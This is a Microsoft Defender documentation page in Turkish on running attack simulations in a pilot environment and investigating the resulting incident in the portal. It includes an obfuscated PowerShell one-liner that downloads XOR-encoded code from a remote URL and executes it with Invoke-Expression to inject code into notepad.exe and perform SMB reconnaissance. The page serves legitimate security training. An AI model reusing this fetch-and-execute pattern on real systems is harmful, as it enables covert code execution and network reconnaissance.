---
title: Microsoft 365 Defender pilot ortamında saldırı simülasyonu çalıştırma
description: Uyarıların ve olayların nasıl sunulduğunu, içgörülerin nasıl kazanıldığından ve tehditlerin hızla düzeltildiğinden haberdar olmak için Microsoft 365 Defender için saldırı simülasyonları çalıştırın.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.date: 07/09/2021
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
- zerotrust-solution
ms.custom: admindeeplinkDEFENDER
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 2fd9dc7e8d597890e8d07ce783938bc1d69b6c78
ms.sourcegitcommit: 61b22df76e0f81e5ef11c587b129287886151c79
ms.translationtype: MT
ms.contentlocale: tr-TR
ms.lasthandoff: 07/12/2022
ms.locfileid: "66748769"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a>Microsoft 365 Defender pilot ortamında saldırı simülasyonu çalıştırma


Bu makale, pilot ortam kullanarak Microsoft 365 Defender bir olayın araştırılması ve yanıtlanması sürecinde [2.Adım 1'dir](eval-defender-investigate-respond.md). Bu işlem hakkında daha fazla bilgi için [genel bakış](eval-defender-investigate-respond.md) makalesine bakın.

[Pilot ortamınızı](eval-defender-investigate-respond.md) hazırladıktan sonra, Microsoft 365 Defender olay yanıtını ve otomatik araştırma ve düzeltme özelliklerini test etmek için sanal saldırıyla bir olay oluşturup araştırmak ve yanıtlamak için Microsoft 365 Defender portalını kullanın.

Microsoft 365 Defender'deki bir olay, bir saldırının hikayesini oluşturan bağıntılı uyarıların ve ilişkili verilerin bir koleksiyonudur.

Microsoft 365 hizmetleri ve uygulamaları, şüpheli veya kötü amaçlı bir olay veya etkinlik algıladığında uyarılar oluşturur. Tek tek uyarılar, tamamlanmış veya devam eden bir saldırı hakkında değerli ipuçları sağlar. Ancak saldırılar genellikle cihazlar, kullanıcılar ve posta kutuları gibi farklı varlık türlerine karşı çeşitli teknikler uygular. Sonuç, kiracınızdaki birden çok varlık için birden çok uyarıdır.

>[!Note]
>Güvenlik analizi ve olay yanıtı konusunda yeniyseniz tipik bir analiz, düzeltme ve olay sonrası gözden geçirme sürecinin kılavuzlu turuna ulaşmak için [İlk olay yanıtınıza yanıt verme kılavuzuna](first-incident-overview.md) bakın.
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a>Microsoft 365 Defender portalı ile saldırıların benzetimini yapın

Microsoft 365 Defender portalı, pilot ortamınızda sanal saldırılar oluşturmak için yerleşik özelliklere sahiptir:

- konumundaki [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator)Office 365 için Microsoft 365 Defender için saldırı simülasyonu eğitimi.
  
  Microsoft 365 Defender portalında **Email & işbirliği > Saldırı simülasyonu eğitimi'ni** seçin.

- saldırı öğreticileri & konumunda [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations)uç nokta için Microsoft 365 Defender simülasyonları.

  <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender portalında</a> **Uç Noktalar > Öğreticiler & simülasyonları'nı** seçin.

### <a name="defender-for-office-365-attack-simulation-training"></a>Office 365 için Defender Saldırı simülasyonu eğitimi

Microsoft 365 E5 veya Office 365 için Microsoft Defender Plan 2 ile Office 365 için Defender, kimlik avı saldırıları için saldırı simülasyonu eğitimi içerir. Temel adımlar şunlardır:

1. Simülasyon oluşturma

   Yeni simülasyon oluşturma ve başlatma hakkında adım adım yönergeler için bkz. [Kimlik avı saldırısı simülasyonu](/microsoft-365/security/office-365-security/attack-simulation-training).

2. Yük oluşturma

   Simülasyonda kullanmak üzere yük oluşturma hakkında adım adım yönergeler için bkz. [Saldırı simülasyonu eğitimi için özel yük oluşturma](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).

3. İçgörü elde etme

   Raporlama ile içgörü elde etme hakkında adım adım yönergeler için bkz. [Saldırı simülasyonu eğitimi aracılığıyla içgörü elde etme](/microsoft-365/security/office-365-security/attack-simulation-training-insights).

   > [!VIDEO https://www.microsoft.com/videoplayer/embed/RWMhvB]

Daha fazla bilgi için bkz [. Simülasyonlar](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a>Uç Nokta için Defender saldırı öğreticileri & simülasyonları

Microsoft'un Uç Nokta için Defender simülasyonları şunlardır:

- Belge arka kapı bırakıldığında
- Otomatik araştırma (arka kapı)

Üçüncü taraf kaynaklardan ek simülasyonlar vardır. Ayrıca bir dizi öğretici de vardır.

Her simülasyon veya öğretici için:

1. Sağlanan ilgili kılavuz belgeyi indirin ve okuyun.

2. Simülasyon dosyasını indirin. Dosyayı veya betiği test cihazına indirmeyi seçebilirsiniz, ancak zorunlu değildir.

3. Test cihazında simülasyon dosyasını veya betiği, kılavuz belgesinde açıklandığı gibi çalıştırın.

 Daha fazla bilgi için bkz[. Simülasyon saldırısı aracılığıyla deneyim Uç Nokta için Microsoft Defender](/microsoft-365/security/defender-endpoint/attack-simulations).

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a>Yalıtılmış etki alanı denetleyicisi ve istemci cihazıyla saldırı simülasyonu yapma (isteğe bağlı)

Bu isteğe bağlı olay yanıtı alıştırmasında, bir PowerShell betiği kullanarak yalıtılmış bir Active Directory Domain Services (AD DS) etki alanı denetleyicisine ve Windows cihazına yönelik bir saldırının benzetimini yapacak ve ardından olayı araştıracak, düzeltip çözeceksiniz.

İlk olarak, pilot ortamınıza uç noktalar eklemeniz gerekir.

### <a name="add-pilot-environment-endpoints"></a>Pilot ortam uç noktaları ekleme

İlk olarak, pilot ortamınıza yalıtılmış bir AD DS etki alanı denetleyicisi ve bir Windows cihazı eklemeniz gerekir.

1. Pilot ortam kiracınızın [Microsoft 365 Defender etkinleştirdiğini](m365d-enable.md#confirm-that-the-service-is-on) doğrulayın.

2. Etki alanı denetleyicinizin:

   - Windows Server 2008 R2 veya sonraki bir sürümü çalıştırır.
   - [Kimlik için Microsoft Defender](/azure/security-center/security-center-wdatp) raporlar ve [uzaktan yönetimi](/windows-server/administration/server-manager/configure-remote-management-in-server-manager) etkinleştirmiştir.
   - [Kimlik için Microsoft Defender ve Microsoft Defender for Cloud Apps tümleştirmesi](/cloud-app-security/mdi-integration) etkindir.
   - Test etki alanında bir test kullanıcısı oluşturuldu mu? Yönetici düzeyinde izinler gerekli değildir.

3. Test cihazınızın:

   - Windows 10 sürüm 1903 veya sonraki bir sürümü çalıştırır.
   - AD DS etki alanı denetleyicisi etki alanına katılır.
   - [Windows Defender Virüsten Koruma](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) etkinleştirildi. Windows Defender Virüsten Koruma etkinleştirme konusunda sorun yaşıyorsanız bu [sorun giderme konusuna bakın](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-microsoft-defender-antivirus-is-not-disabled-by-a-policy).
   - [Uç Nokta için Microsoft Defender'a eklenir](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

Kiracı ve cihaz grupları kullanıyorsanız test cihazı için ayrılmış bir cihaz grubu oluşturun ve en üst düzeye itin.

Alternatiflerden biri, AD DS etki alanı denetleyicinizi barındırmak ve cihazı Microsoft Azure altyapı hizmetlerinde sanal makine olarak test etmektir. [Sanal kurumsal Test Laboratuvarı Kılavuzu'nun 1. Aşamasındaki](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet) yönergeleri kullanabilirsiniz, ancak APP1 sanal makinesinin oluşturulmasını atlayabilirsiniz.

Sonuç aşağıdadır.

:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png" alt-text="Simülasyon kurumsal Test Laboratuvarı Kılavuzu'nu kullanan değerlendirme ortamı" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png":::

Algılamadan gizlemek için gelişmiş tekniklerden yararlanan gelişmiş bir saldırının benzetimini yapacaksınız. Saldırı, etki alanı denetleyicilerindeki açık Sunucu İleti Bloğu (SMB) oturumlarını numaralandırır ve kullanıcıların cihazlarının son IP adreslerini alır. Bu saldırı kategorisi genellikle kurbanın cihazına bırakılan dosyaları içermez ve bunlar yalnızca bellekte gerçekleşir. Mevcut sistem ve yönetim araçlarını kullanarak "arazide yaşarlar" ve yürütmelerini gizlemek için kodlarını sistem süreçlerine eklerler. Bu tür davranışlar, cihazda algılamadan kaçınmalarını ve kalıcı olmalarını sağlar.

Bu simülasyonda örnek senaryomuz bir PowerShell betiğiyle başlar. Gerçek dünyada, bir kullanıcı bir betiği çalıştırması için kandırılabilir veya betik daha önce virüs bulaşmış bir cihazdan başka bir bilgisayara uzak bir bağlantıdan çalıştırılabilir ve bu da saldırganın ağda yaya olarak hareket etmeye çalıştığını gösterir. Yöneticiler çeşitli yönetim etkinliklerini gerçekleştirmek için genellikle betikleri uzaktan çalıştırdığından bu betiklerin algılanması zor olabilir.

:::image type="content" source="../../media/mtp/mtpdiydiagram.png" alt-text="İşlem ekleme ve SMB mutabakat saldırısı ile Dosyasız PowerShell saldırısı" lightbox="../../media/mtp/mtpdiydiagram.png":::

Simülasyon sırasında saldırı, kabuk kodunu görünüşte masum bir işleme ekler. Senaryo için notepad.exe kullanılması gerekir. Simülasyon için bu işlemi seçtik ancak saldırganlar büyük olasılıkla svchost.exe gibi uzun süre çalışan bir sistem işlemini hedeflemektedir. Ardından kabuk kodu, devam etme yönergelerini almak için saldırganın komut ve denetim (C2) sunucusuna başvurmaya devam eder. Betik, etki alanı denetleyicisinde (DC) keşif sorguları yürütmeye çalışır. Keşif, saldırganın son kullanıcı oturum açma bilgileri hakkında bilgi almasına olanak tanır. Saldırganlar bu bilgilere sahip olduktan sonra, belirli bir hassas hesaba ulaşmak için ağda yaya olarak hareket edebilir

> [!IMPORTANT]
> En iyi sonuçlar için saldırı simülasyonu yönergelerini mümkün olduğunca yakından izleyin.

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a>Yalıtılmış AD DS etki alanı denetleyicisi saldırı benzetimi çalıştırma

Saldırı senaryosu simülasyonunu çalıştırmak için:

1. Pilot ortamınızın yalıtılmış AD DS etki alanı denetleyicisini ve Windows cihazını içerdiğinden emin olun.

2. Test kullanıcısı hesabıyla test cihazında oturum açın.

3. Test cihazında bir Windows PowerShell penceresi açın.

4. Aşağıdaki simülasyon betiğini kopyalayın:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Bu makaleyi bir web tarayıcısında açarsanız, belirli karakterleri kaybetmeden veya fazladan satır sonları eklemeden tam metni kopyalarken sorunlarla karşılaşabilirsiniz. Bu durumda, bu belgeyi indirin ve Adobe Reader'da açın.

5. Kopyalanan betiği PowerShell penceresinde yapıştırın ve çalıştırın.

> [!NOTE]
> PowerShell'i uzak masaüstü protokolü (RDP) kullanarak çalıştırıyorsanız **, CTRL-V** kısayol tuşu veya sağ tıklama-yapıştırma yöntemi çalışmayabileceği için RDP istemcisinde Pano Metni Yazın komutunu kullanın. PowerShell'in son sürümleri de bazen bu yöntemi kabul etmeyebilir, önce bellekte Not Defteri'ne kopyalamanız, sanal makineye kopyalamanız ve ardından PowerShell'e yapıştırmanız gerekebilir.

Birkaç saniye sonra Not Defteri uygulaması açılır. Not Defteri'ne sanal bir saldırı kodu eklenecektir. Senaryonun tamamını deneyimlemek için otomatik olarak oluşturulan Not Defteri örneğini açık tutun.

Sanal saldırı kodu bir dış IP adresiyle iletişim kurmaya (C2 sunucusu simülasyonu) ve ardından SMB aracılığıyla etki alanı denetleyicisine karşı keşif yapmaya çalışır.

Bu betik tamamlandığında PowerShell konsolunda bu iletiyi görürsünüz:

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Otomatik Olay ve Yanıt özelliğinin çalıştığını görmek için notepad.exe işlemini açık tutun. Otomatik Olay ve Yanıt'ın Not Defteri işlemini durdurduğu görürsünüz.

### <a name="investigate-the-incident-for-the-simulated-attack"></a>Simülasyon saldırısı için olayı araştırma

> [!NOTE]
> Bu simülasyonda size yol göstermeden önce, olay yönetiminin araştırma sürecinin bir parçası olarak ilgili uyarıları birlikte oluşturmanıza nasıl yardımcı olduğunu, portalda nerede bulabileceğinizi ve güvenlik işlemlerinizde size nasıl yardımcı olabileceğini görmek için aşağıdaki videoyu izleyin:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

SOC analisti bakış açısına geçtiğinizde artık Microsoft 365 Defender portalında saldırıyı araştırmaya başlayabilirsiniz.

1. <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender portalını</a> açın.

2. Gezinti bölmesinde **Olaylar & Uyarılar > Olaylar'ı** seçin.

3. Simülasyon saldırısı için yeni olay, olay kuyruğunda görünür.

   :::image type="content" source="../../media/mtp/fig2.png" alt-text="Olaylar kuyruğu örneği" lightbox="../../media/mtp/fig2.png":::

#### <a name="investigate-the-attack-as-a-single-incident"></a>Saldırıyı tek bir olay olarak araştırma

Microsoft 365 Defender analizi ilişkilendirerek farklı ürünlerden gelen tüm ilgili uyarıları ve araştırmaları tek bir olay varlığında toplar. Bunu yaparak Microsoft 365 Defender, SOC analistinin karmaşık tehditleri anlamasına ve yanıtlamasına olanak sağlayan daha geniş bir saldırı hikayesi gösterir.

Bu simülasyon sırasında oluşturulan uyarılar aynı tehditle ilişkilendirilir ve sonuç olarak otomatik olarak tek bir olay olarak toplanır.

Olayı görüntülemek için:

1. <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender portalını</a> açın.

2. Gezinti bölmesinde **Olaylar & Uyarılar > Olaylar'ı** seçin.

3. Olay adının solundaki daireye tıklayarak en yeni öğeyi seçin. Yan panel, ilgili tüm uyarılar da dahil olmak üzere olay hakkında ek bilgiler görüntüler. Her olayın, içerdiği uyarıların özniteliklerine göre bunu açıklayan benzersiz bir adı vardır.

   Panoda gösterilen uyarılar hizmet kaynaklarına göre filtrelenebilir: Kimlik için Microsoft Defender, Microsoft Defender for Cloud Apps, Uç Nokta için Microsoft Defender, Microsoft 365 Defender ve Office 365 için Microsoft Defender.

3. Olay hakkında daha fazla bilgi edinmek için **Olay sayfasını aç'ı** seçin.

   **Olay** sayfasında, olayla ilgili tüm uyarıları ve bilgileri görebilirsiniz. Bilgiler uyarıya katılan varlıkları ve varlıkları, uyarıların algılama kaynağını (Kimlik için Microsoft Defender veya Uç Nokta için Microsoft Defender gibi) ve bunların birbirine bağlanma nedenini içerir. Olay uyarısı listesini gözden geçirmek, saldırının ilerleme durumunu gösterir. Bu görünümden tek tek uyarıları görebilir ve araştırabilirsiniz.

   Ayrıca sağ taraftaki menüden **Olayı yönet'e** tıklayarak olayı etiketleyebilir, kendinize atayabilir ve açıklama ekleyebilirsiniz.

#### <a name="review-generated-alerts"></a>Oluşturulan uyarıları gözden geçirme

Şimdi simülasyon saldırısı sırasında oluşturulan uyarılardan bazılarına göz atalım.

> [!NOTE]
> Simülasyon saldırısı sırasında oluşturulan uyarılardan yalnızca birkaçını inceleyeceğiz. Windows sürümüne ve test cihazınızda çalışan Microsoft 365 Defender ürünlerine bağlı olarak, biraz farklı bir sırada görünen daha fazla uyarı görebilirsiniz.

:::image type="content" source="../../media/mtp/fig6.png" alt-text="Oluşturulan uyarı örneği" lightbox="../../media/mtp/fig6.png":::

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a>Uyarı: Şüpheli işlem ekleme gözlemlendi (Kaynak: Uç Nokta için Microsoft Defender)

Gelişmiş saldırganlar bellekte kalıcı hale getirmek ve algılama araçlarından gizlemek için gelişmiş ve gizli yöntemler kullanır. Yaygın tekniklerden biri, kötü amaçlı yürütülebilir dosya yerine güvenilir bir sistem işlemi içinde çalışmaktır ve bu da algılama araçlarının ve güvenlik işlemlerinin kötü amaçlı kodu tespit etmelerini zorlaştırmaktır.

SOC analistlerinin bu gelişmiş saldırıları yakalamasına izin vermek için, Uç Nokta için Microsoft Defender'daki derin bellek algılayıcıları bulut hizmetimize çeşitli işlemler arası kod ekleme teknikleri hakkında daha önce görülmemiş görünürlük sağlar. Aşağıdaki şekilde, Uç Nokta için Defender'ın <i>notepad.exe</i>kod ekleme girişiminde nasıl algılandığı ve uyarılandığı gösterilmektedir.

:::image type="content" source="../../media/mtp/fig7.png" alt-text="Kötü amaçlı olabilecek bir kod eklemeye yönelik uyarı örneği" lightbox="../../media/mtp/fig7.png":::

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a>Uyarı: Komut satırı bağımsız değişkeni olmayan bir işlem çalıştırması tarafından gözlemlenen beklenmeyen davranış (Kaynak: Uç Nokta için Microsoft Defender)

Uç Nokta için Microsoft Defender algılamaları genellikle bir saldırı tekniğinin en yaygın özniteliğini hedefler. Bu yöntem dayanıklılık sağlar ve saldırganların daha yeni taktiklere geçiş yapma çıtasını yükseltir.

Kuruluş içinde ve dünya çapında ortak süreçlerin normal davranışını oluşturmak ve bu işlemlerin anormal davranışları ne zaman gösterdiğini izlemek için büyük ölçekli öğrenme algoritmaları kullanırız. Bu anormal davranışlar genellikle fazladan kod sunulduğunu ve başka bir şekilde güvenilen bir işlemde çalıştığını gösterir.

Bu senaryo için <i> ,notepad.exe</i> işlem, dış konumla iletişim içeren anormal davranışlar sergiliyor. Bu sonuç, kötü amaçlı kodu tanıtmak ve yürütmek için kullanılan belirli yöntemden bağımsızdır.

> [!NOTE]
> Bu uyarı, ek arka uç işlemesi gerektiren makine öğrenmesi modellerini temel alındığından, bu uyarıyı portalda görmeniz biraz zaman alabilir.

Uyarı ayrıntılarında dış IP adresinin (araştırmayı genişletmek için özet olarak kullanabileceğiniz bir gösterge) olduğuna dikkat edin.

IP adresi ayrıntıları sayfasını görüntülemek için uyarı işlemi ağacında IP adresini seçin.

:::image type="content" source="../../media/mtp/fig8.png" alt-text="Komut satırı bağımsız değişkenleri olmayan bir işlem çalıştırması tarafından beklenmeyen davranış örneği" lightbox="../../media/mtp/fig8.png":::

Aşağıdaki şekilde seçili IP Adresi ayrıntıları sayfası görüntülenir (Uyarı işlem ağacında IP adresine tıklanması).

:::image type="content" source="../../media/mtp/fig9.png" alt-text="IP adresi ayrıntıları sayfası örneği" lightbox="../../media/mtp/fig9.png":::

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Uyarı: Kullanıcı ve IP adresi keşfi (SMB) (Kaynak: Kimlik için Microsoft Defender)

Sunucu İleti Bloğu (SMB) protokolü kullanılarak numaralandırma, saldırganların belirli bir hassas hesaba erişmek için ağ üzerinden daha sonra hareket etmelerine yardımcı olan son kullanıcı oturum açma bilgilerini almalarına olanak tanır.

Bu algılamada, SMB oturum numaralandırması bir etki alanı denetleyicisinde çalıştırıldığında bir uyarı tetikleniyor.

:::image type="content" source="../../media/mtp/fig10.png" alt-text="Kullanıcı ve IP adresi keşfi için Kimlik için Microsoft Defender uyarısı örneği" lightbox="../../media/mtp/fig10.png":::

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a>Uç Nokta için Microsoft Defender ile cihaz zaman çizelgesini gözden geçirin

Bu olaydaki çeşitli uyarıları inceledikten sonra daha önce araştırdığınız olay sayfasına geri dönün. Uç Nokta için Microsoft Defender ve Kimlik için Microsoft Defender tarafından bildirilen bu olaya dahil olan cihazları gözden geçirmek için olay sayfasındaki **Cihazlar** sekmesini seçin.

Saldırının gerçekleştirildiği cihazın adını seçerek ilgili cihazın varlık sayfasını açın. Bu sayfada, tetiklenen uyarıları ve ilgili olayları görebilirsiniz.

**Zaman Çizelgesi** sekmesini seçerek cihaz zaman çizelgesini açın ve cihazda gözlemlenen tüm olayları ve davranışları, tetiklenen uyarılarla birlikte kronolojik sırada görüntüleyin.

:::image type="content" source="../../media/mtp/fig11.png" alt-text="Davranışlar içeren cihaz zaman çizelgesi örneği" lightbox="../../media/mtp/fig11.png":::

Daha ilginç davranışlardan bazılarını genişletmek, işlem ağaçları gibi yararlı ayrıntılar sağlar.

Örneğin, **uyarı olayı Şüpheli işlem ekleme gözlemlenene** kadar aşağı kaydırın. Yan bölmedeki **Olay varlıkları** grafiğinin altında bu davranışa yönelik tam işlem ağacını görüntülemek için altındaki **notepad.exe işlem** olayına eklenenpowershell.exe seçin. Gerekirse filtreleme için arama çubuğunu kullanın.

:::image type="content" source="../../media/mtp/fig12.png" alt-text="Seçili PowerShell dosya oluşturma davranışı için işlem ağacı örneği" lightbox="../../media/mtp/fig12.png":::

#### <a name="review-the-user-information-with-microsoft-defender-for-cloud-apps"></a>Microsoft Defender for Cloud Apps ile kullanıcı bilgilerini gözden geçirme

Saldırıyla ilgili kullanıcıların listesini görüntülemek için olay sayfasında **Kullanıcılar** sekmesini seçin. Tablo, her kullanıcının **Araştırma Önceliği** puanı dahil olmak üzere her kullanıcı hakkında ek bilgiler içerir.

Daha fazla araştırmanın yürütülebileceği kullanıcının profil sayfasını açmak için kullanıcı adını seçin. [Riskli kullanıcıları araştırma hakkında daha fazla bilgi edinin](/cloud-app-security/tutorial-ueba#identify).

:::image type="content" source="../../media/mtp/fig13.png" alt-text="Cloud Apps için Defender kullanıcı sayfası" lightbox="../../media/mtp/fig13.png":::

#### <a name="automated-investigation-and-remediation"></a>Otomatik araştırma ve düzeltme

> [!NOTE]
>Bu simülasyonda size yol göstermeden önce otomatik kendi kendini düzeltmenin ne olduğunu, portalda nerede bulabileceğinizi ve güvenlik işlemlerinizde nasıl yardımcı olabileceğini öğrenmek için aşağıdaki videoyu izleyin:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Microsoft 365 Defender portalında olaya geri dönün. **Olay** sayfasındaki **Araştırma sekmesi**, Kimlik için Microsoft Defender ve Uç Nokta için Microsoft Defender tarafından tetiklenen otomatik araştırmaları gösterir. Aşağıdaki ekran görüntüsünde yalnızca Uç Nokta için Defender tarafından tetiklenen otomatik araştırma gösterilir. Varsayılan olarak, Uç Nokta için Defender kuyrukta bulunan yapıtları otomatik olarak düzelterek düzeltme gerektirir.

:::image type="content" source="../../media/mtp/fig14.png" alt-text="Olayla ilgili otomatik araştırmalara örnek" lightbox="../../media/mtp/fig14.png":::

**Araştırma ayrıntıları** sayfasını açmak için araştırmayı tetikleyen uyarıyı seçin. Aşağıdaki ayrıntıları görürsünüz:

- Otomatik araştırmayı tetikleyen uyarılar.
- Etkilenen kullanıcılar ve cihazlar. Göstergeler ek cihazlarda bulunursa, bu ek cihazlar da listelenir.
- Kanıt listesi. Dosyalar, işlemler, hizmetler, sürücüler ve ağ adresleri gibi bulunan ve analiz edilen varlıklar. Bu varlıklar, uyarıyla olası ilişkiler için analiz edilir ve zararsız veya kötü amaçlı olarak derecelendirilir.
- Tehditler bulundu. Araştırma sırasında bulunan bilinen tehditler.

> [!NOTE]
> Zamanlamaya bağlı olarak otomatik araştırma hala çalışıyor olabilir. Kanıtı toplayıp analiz edip sonuçları gözden geçirmeden önce işlemin tamamlanması için birkaç dakika bekleyin. En son bulguları almak için **Araştırma ayrıntıları** sayfasını yenileyin.

:::image type="content" source="../../media/mtp/fig15.png" alt-text="Araştırma ayrıntıları sayfasına bir örnek" lightbox="../../media/mtp/fig15.png":::

Otomatik araştırma sırasında, Uç Nokta için Microsoft Defender düzeltme gerektiren yapıtlardan biri olarak eklenen notepad.exe işlemini tanımladı. Uç Nokta için Defender, otomatik düzeltmenin bir parçası olarak şüpheli işlem ekleme işlemini otomatik olarak durdurur.

Test cihazında çalışan işlemler listesinden <i>notepad.exe</i> kaybolduğunu görebilirsiniz.

#### <a name="resolve-the-incident"></a>Olayı çözme

Araştırma tamamlandıktan ve düzeltileceği onaylandıktan sonra olayı çözersiniz.

Olay sayfasında **Olayı** **yönet'i** seçin. **Durumu Olayı çöz** olarak ayarlayın ve sınıflandırma için **Doğru uyarı** ve belirleme için **Güvenlik testi'ni** seçin.

:::image type="content" source="../../media/mtp/fig16.png" alt-text="Olayı çözmek için anahtara tıklayabileceğiniz açık Olay yönet panelinin bulunduğu olaylar sayfasının bir örneği" lightbox="../../media/mtp/fig16.png":::

Olay çözümlendiğinde, Microsoft 365 Defender portalında ve ilgili portallarda ilişkili tüm uyarıları çözümler.

Bu, olay analizi, otomatik araştırma ve olay çözümleme için saldırı simülasyonlarını tamamlar.

## <a name="next-step"></a>Sonraki adım

[:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png" alt-text="Microsoft 365 Defender olay yanıtı özellikleri" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png":::](eval-defender-investigate-respond-additional.md)

Adım 2 / 2: [Olay yanıtı özelliklerini Microsoft 365 Defender deneyin](eval-defender-investigate-respond-additional.md)

### <a name="navigation-you-may-need"></a>İhtiyaç duyabileceğiniz gezinti

[Microsoft 365 Defender Değerlendirme Ortamı Oluşturma](eval-create-eval-environment.md)
